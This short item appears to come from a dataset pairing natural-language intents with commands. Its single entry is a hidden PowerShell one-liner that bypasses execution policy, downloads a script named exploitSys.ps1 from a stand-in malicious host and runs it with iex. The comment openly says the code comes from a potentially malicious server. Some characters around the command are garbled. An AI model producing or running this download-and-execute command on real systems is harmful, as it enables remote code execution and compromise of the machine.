# Natural language intent:
# Download and execute PowerShell code from a potentially malicious server with specific encoding.

powershell.exe -NoP -NonI -W Hidden -Exec Bypass �iex (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')�
